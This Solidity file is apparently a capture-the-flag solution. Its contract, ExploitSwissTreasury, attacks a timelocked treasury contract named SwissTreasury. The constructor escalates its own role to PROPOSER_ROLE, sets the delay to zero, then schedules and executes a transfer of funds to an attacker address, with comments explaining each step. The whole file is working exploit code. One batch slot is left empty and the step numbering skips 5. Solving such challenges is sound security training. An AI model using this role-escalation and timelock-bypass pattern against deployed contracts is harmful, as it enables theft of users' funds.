// SPDX-License-Identifier: MIT
pragma solidity 0.8.4;

import "./SwissTreasury.sol";

contract ExploitSwissTreasury {
    SwissTreasury private instance;

    // address private finalize;

    constructor(
        address payable _instance,
        address attacker,
        address finalizer
    ) {
        instance = SwissTreasury(_instance);
        //step 0 - do it from constructor in order to pass the EXECUTOR Role check

        // core
        address[] memory targets = new address[](7);
        targets[0] = _instance;
        targets[1] = _instance;
        targets[2] = _instance;
        targets[3] = _instance;
        targets[4] = _instance;
        targets[5] = _instance;
        targets[6] = finalizer;

        uint256[] memory values = new uint256[](7);

        bytes[] memory datas = new bytes[](7);

        /* step 1 - privilege escalatation
            from EXECUTOR_ROLE to PROPOSER_ROLE */

        datas[0] = abi.encodeWithSignature(
            "grantRole(bytes32,address)",
            keccak256("PROPOSER_ROLE"),
            _instance
        );

        /* step 2 - remove delay
            so new proposal can be executed immediately */

        datas[1] = abi.encodeWithSignature("updateDelay(uint256)", 0);

        /* step 3 - schedule distribute funds to attacker */

        datas[2] = abi.encodeWithSignature(
            "schedule(address,uint256,bytes,bytes32,bytes32,uint256)",
            _instance,
            0,
            abi.encodeWithSignature(
                "distributeFunds(address,uint256)",
                attacker,
                10000000 gwei
            ),
            0,
            0,
            0
        );

        /* step 4 execute distribute funds
         */

        datas[3] = abi.encodeWithSignature(
            "execute(address,uint256,bytes,bytes32,bytes32)",
            _instance,
            0,
            abi.encodeWithSignature(
                "distributeFunds(address,uint256)",
                attacker,
                10000000 gwei
            ),
            0,
            0
        );

        /* step 6 - give finalizer contract
            the PROPOSER_ROLE 
        */

        datas[5] = abi.encodeWithSignature(
            "grantRole(bytes32,address)",
            keccak256("PROPOSER_ROLE"),
            finalizer
        );

        //call random function from finalizer in order to call its fallback function
        datas[6] = abi.encodeWithSignature("randomFunction()");

        //call the executeBatch function
        instance.executeBatch(targets, values, datas, 0, 0);
    }
}
